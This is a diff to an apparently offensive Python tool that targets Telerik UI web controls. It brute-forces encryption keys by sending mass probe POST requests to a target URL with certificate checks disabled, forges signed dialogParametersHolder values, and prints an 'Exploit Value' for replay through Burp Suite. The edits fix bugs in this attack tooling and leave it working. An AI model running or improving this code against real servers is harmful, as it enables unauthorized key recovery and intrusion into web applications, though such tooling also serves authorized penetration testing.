@@ -20,7 +20,6 @@ from requests.packages.urllib3.exceptions import InsecureRequestWarning
 from Crypto.Cipher import AES
 from Crypto.Hash import HMAC
 from Crypto.Hash import SHA256
-from Crypto.Hash import SHA1
 
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
@@ -342,7 +341,7 @@ class DialogHandler:
         ct = self.telerik_encryptionkey.telerik_encrypt(derivedKey, derivedIV, plaintext)
         dialog_parameters = self.telerik_hashkey.sign_enc_dialog_params(self.hash_key, ct)
         dialog_parameters_data = {"dialogParametersHolder": dialog_parameters}
-        r = requests.post(self.url, data=dialog_parameters_data, headers=headers, verify=False, proxies=self.proxies)
+        r = requests.post(self.url, data=dialog_parameters_data, headers=self.headers, verify=False, proxies=self.proxies)
         if r.status_code == 200:
             return dialog_parameters
 
@@ -406,11 +405,11 @@ class DialogHandler:
 
                 encryptionkey_counter = 0
                 for encryption_key_probe, encryption_key in self.telerik_encryptionkey.encryptionkey_probe_generator(
-                    hash_key, key_derive_mode, include_machinekeys=include_machinekeys_bool
+                    hash_key, self.key_derive_mode, include_machinekeys=self.include_machinekeys_bool
                 ):
                     encryptionkey_counter += 1
                     data = {"dialogParametersHolder": encryption_key_probe}
-                    res = requests.post(self.url, data=data, proxies=proxies, headers=self.headers, verify=False)
+                    res = requests.post(self.url, data=data, proxies=self.proxies, headers=self.headers, verify=False)
 
                     if encryptionkey_counter % 1000 == 0:
                         print(f"Tested {str(encryptionkey_counter)} encryption keys so far...")
@@ -587,7 +586,6 @@ def main():
                 print("Submit a POST request, with dialogParametersHolder POST parameter set to this value")
                 print("Then use Burp Suite to replay the request in the browser")
                 print("Dialog Parameters Exploit Value:")
-                formatted_dialog_parameters = urllib.parse.quote_plus(dh.dialog_parameters)
                 print(urllib.parse.quote_plus(dh.dialog_parameters))
 
 
